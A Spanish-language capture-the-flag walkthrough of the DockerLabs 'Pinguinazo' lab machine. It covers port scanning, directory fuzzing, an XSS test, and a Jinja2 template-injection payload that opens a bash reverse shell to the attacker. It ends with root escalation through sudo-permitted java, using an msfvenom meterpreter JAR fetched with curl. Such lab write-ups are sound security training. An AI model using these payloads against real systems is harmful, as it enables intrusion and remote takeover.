---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Pinguinazo DockerLabs (Easy)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip pinguinazo.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh pinguinazo.tar
```

Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____   
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__   
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___]  

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-28 14:36 EST
Nmap scan report for 172.17.0.2
Host is up (0.000040s latency).

PORT     STATE SERVICE VERSION
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.1 Python/3.12.3
|     Date: Tue, 28 Jan 2025 19:36:41 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 1718
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Pingu Flask Web</title>
|     <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
|     </head>
|     <body>
|     <div class="container mt-5">
|     class="text-center">PinguRegistro</h1>
|     <form method="post" action="/greet">
|     <div class="form-group">
|     <label for="name">PinguNombre</label>
|     <input type="text" class="form-control" id="name" name="name" placeholder="Enter your name">
|     </div>
|     <div class="form-group">
|     <label for="birthday">Pi
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=1/28%Time=679931C9%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,765,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.1\
SF:x20Python/3\.12\.3\r\nDate:\x20Tue,\x2028\x20Jan\x202025\x2019:36:41\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x201718\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20la
SF:ng=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x
SF:20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x
SF:20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Pingu\x20Flask\x20Web</
SF:title>\n\x20\x20\x20\x20<link\x20href=\"https://stackpath\.bootstrapcdn
SF:\.com/bootstrap/4\.5\.2/css/bootstrap\.min\.css\"\x20rel=\"stylesheet\"
SF:>\n</head>\n<body>\n\x20\x20\x20\x20<div\x20class=\"container\x20mt-5\"
SF:>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\"text-center\">PinguRe
SF:gistro</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<form\x20method=\"post\"\x
SF:20action=\"/greet\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<
SF:div\x20class=\"form-group\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20<label\x20for=\"name\">PinguNombre</label>\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<input\x20t
SF:ype=\"text\"\x20class=\"form-control\"\x20id=\"name\"\x20name=\"name\"\
SF:x20placeholder=\"Enter\x20your\x20name\">\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20</div>\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20<div\x20class=\"form-group\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20<label\x20for=\"birthday\">Pi")%r(RTSPRequ
SF:est,16C,"<!DOCTYPE\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<he
SF:ad>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x
SF:20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x2
SF:0code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x
SF:20request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20<p>Error\x20code\x20explanation:\x20400\x20-\x20Bad\x20request\
SF:x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>
SF:\n</html>\n");
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.69 seconds
```

Si entramos en dicho puerto veremos una pagina web en la que mostrara un formulario de registro, vamos a ver si encontramos algo.

Si introducimos todos los datos y los enviamos, veremos que nos hemos registrado de forma exitosa y nos saluda, vamos a realizar un poco de `fuzzing`.

## Gobuster

```shell
gobuster dir -u http://<IP>:5000/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2:5000/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/console              (Status: 200) [Size: 1563]
Progress: 38072 / 81880 (46.50%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 38130 / 81880 (46.57%)
===============================================================
Finished
===============================================================
```

Vemos que nos saco un directorio llamado `/console`, pero si entramos vemos que esta protegido con una contraseña, por lo que vamos a dejarlo en segundo plano.

Vamos a ver si detecta algun `software` de esta pagina en la que podamos investigar:

## Whatweb

```shell
whatweb http://<IP>:5000/
```

Info:

```
http://172.17.0.2:5000/ [200 OK] Bootstrap[4.5.2], Country[RESERVED][ZZ], Email[admin@pingulab.lab], HTML5, HTTPServer[Werkzeug/3.0.1 Python/3.12.3], IP[172.17.0.2], JQuery, Python[3.12.3], Script, Title[Pingu Flask Web], Werkzeug[3.0.1]
```

Vemos que el `software` se llama `Werkzeug` por lo que vamos a ver si tuviera asociado algun `exploit`.

Pero vemos que no encontramos nada, vamos a volver atras y ver si tuviera algun `XSS`, poniendo lo siguiente:

```
<script>alert('XSS')</script>
```

Y vemos que funciona:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Por lo que vamos a ver si funciona la tecnica de `Server Side Template Injection` en la siguiente pagina:

URL = [Info Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2)

Vamos a probar a meter algo basico:

```
{{7*7}}
```

Esto deberia de mostrar `49`, si lo enviamos vemos que ciertamente nos muestra el numero `49`, por lo que haremos lo siguiente creandonos una `reverse shell`.

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"').read() }}
```

Pero antes de enviar esto tendremos que estar a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora si podremos enviar ese comando, y si nos volvemos donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.186] from (UNKNOWN) [172.17.0.2] 57328
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
pinguinazo@4dd090c078de:~$ whoami
whoami
pinguinazo
```

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for pinguinazo on 4dd090c078de:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User pinguinazo may run the following commands on 4dd090c078de:
    (ALL) NOPASSWD: /usr/bin/java
```

Vemos que podemos ejecutar el binario `java` como el usuario `root`, por lo que haremos lo siguiente:

Primero crearemos un archivo en `JAVA` de la siguiente forma:

> script.js

```js
public class Exploit {
    public static void main(String[] args) {
        try {
            Runtime.getRuntime().exec("/bin/bash");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

Ahora teniendo como `sudo` el binario `java` podremos ejecutarlo como el usuario `root` y con ello obtendremos una `shell` como `root`.

> Maquina host

```shell
msfvenom -p java/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f jar -o Exploit.jar
```

Y esta aplicacion que nos ha generado nos lo tendremos que pasar a la maquina victima de la siguiente forma:

```shell
python3 -m http.server
```

Y ahora en la maquina victima nos la descaragremos de la siguiente forma:

```shell
cd /tmp
curl -O http://<IP>:8000/Exploit.jar
```

Ahora antes de ejecutarlo, nos pondremos a la escucha desde `metasploit` con el siuginete archivo para que se haga de forma automatica:

> listener.rc

```
use exploit/multi/handler
set payload java/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT <PORT>
exploit
```

```shell
msfconsole -q -r listener.rc
```

Una vez echo todo lo anterior y estando a la escucha en la maquina victima ejeuctaremos el archivo como `root`:

```shell
sudo /usr/bin/java -jar Exploit.jar
```

Y ahora si volvemos a donde tenemos la escucha, veremos lo siguiente:

```
[*] Processing listener.rc for ERB directives.
resource (listener.rc)> msfconsole
[-] msfconsole cannot be run inside msfconsole
resource (listener.rc)> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
resource (listener.rc)> set payload java/meterpreter/reverse_tcp
payload => java/meterpreter/reverse_tcp
resource (listener.rc)> set LHOST 192.168.5.186
LHOST => 192.168.5.186
resource (listener.rc)> set LPORT 7755
LPORT => 7755
resource (listener.rc)> exploit
[*] Started reverse TCP handler on 192.168.5.186:7755 
[*] Sending stage (57971 bytes) to 172.17.0.2
[*] Meterpreter session 1 opened (192.168.5.186:7755 -> 172.17.0.2:38156) at 2025-01-28 16:07:23 -0500

meterpreter > getuid
Server username: root
```

Vemos que ya seremos `root`, por lo que habremos terminado la maquina.
